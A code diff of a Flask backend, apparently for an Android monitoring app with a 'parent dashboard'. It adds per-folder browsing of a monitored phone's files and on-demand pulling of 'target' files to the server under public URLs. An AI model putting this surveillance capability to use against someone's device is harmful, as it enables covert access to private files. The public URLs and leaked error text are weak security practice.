@@ -7,25 +7,25 @@ import uuid
 
 files_bp = Blueprint('files', __name__)
 
+# 🚀 UPGRADED: Path-based directory traversal (Text-First)
 @files_bp.route('/api/files', methods=['GET'])
 @token_required
 def get_files():
     device_id = request.args.get('device_id')
-    # Pagination limit taaki browser crash na ho
+    folder_path = request.args.get('path', '/') # Frontend se path aayega
     limit = request.args.get('limit', 150) 
     
     if not device_id or not verify_device_access(request.owner_id, device_id):
         return jsonify({"status": "error", "message": "Access validation check failed"}), 403
 
     try:
-        res = supabase.table('files').select('*').eq('device_id', device_id).order('uploaded_at', desc=True).limit(limit).execute()
+        # Ab Supabase sirf usi folder ka text/metadata dega jo manga gaya hai
+        # Assuming database has a column 'folder_path' or 'parent_path' where Android saves the location
+        res = supabase.table('files').select('*').eq('device_id', device_id).eq('folder_path', folder_path).order('file_name', desc=False).limit(limit).execute()
         return jsonify({"status": "success", "data": res.data}), 200
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# ==========================================
-# 🚀 UPGRADED: ACTUAL FILE UPLOAD ENGINE (Multipart)
-# ==========================================
 @files_bp.route('/api/files/upload', methods=['POST'])
 def upload_file_tracker():
     token = request.headers.get('X-Device-Token')
@@ -39,7 +39,6 @@ def upload_file_tracker():
 
         dev_id = dev_check.data[0]['id']
         
-        # 1. Check if actual physical file is attached in the request
         if 'file' not in request.files:
             return jsonify({"status": "error", "message": "Physical file payload missing"}), 400
             
@@ -47,50 +46,43 @@ def upload_file_tracker():
         if file.filename == '':
             return jsonify({"status": "error", "message": "No file selected"}), 400
 
-        # 2. Extract extra form data sent by Android
         file_type = request.form.get('file_type', 'generic/binary')
         
-        # 3. Secure the filename and create a unique path
+        # Security & UUID injection
         filename = secure_filename(file.filename)
         unique_filename = f"{dev_id}/{uuid.uuid4()}_{filename}"
         file_content = file.read()
 
-        # 4. Upload physical file to Supabase Storage Bucket ('device_media')
+        # Upload to Supabase bucket
         supabase.storage.from_('device_media').upload(
             path=unique_filename, 
             file=file_content,
             file_options={"content-type": file.content_type}
         )
         
-        # 5. Generate Public URL
         public_url = supabase.storage.from_('device_media').get_public_url(unique_filename)
 
-        # 6. Save metadata to Database
+        # Update the existing text metadata with the actual file URL
+        # We match by device_id and exact file_name to attach the URL
         payload = {
-            "device_id": dev_id,
-            "file_name": filename,
-            "file_type": file_type,
             "file_url": public_url,
-            "file_size": f"{len(file_content) / 1024:.2f} KB" # Convert bytes to KB
+            "is_uploaded": True # Flag to tell frontend it's ready to download
         }
+        
+        # Updating the record instead of inserting a new one
+        res = supabase.table('files').update(payload).eq('device_id', dev_id).eq('file_name', filename).execute()
 
-        res = supabase.table('files').insert(payload).execute()
-
-        # 7. Add a log entry for the parent dashboard
         supabase.table('activity_logs').insert({
             "device_id": dev_id,
-            "event_type": "Media Uploaded",
-            "description": f"New {file_type} captured and saved."
+            "event_type": "On-Demand Media Extracted",
+            "description": f"Target file '{filename}' successfully pulled to server."
         }).execute()
 
-        return jsonify({"status": "success", "data": res.data[0]}), 201
+        return jsonify({"status": "success", "data": res.data}), 201
     except Exception as e:
         print(f"File Upload Crash: {str(e)}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# ==========================================
-# STORAGE MANAGEMENT: Clear File Logs API
-# ==========================================
 @files_bp.route('/api/files/clear', methods=['POST'])
 @token_required
 def clear_files():
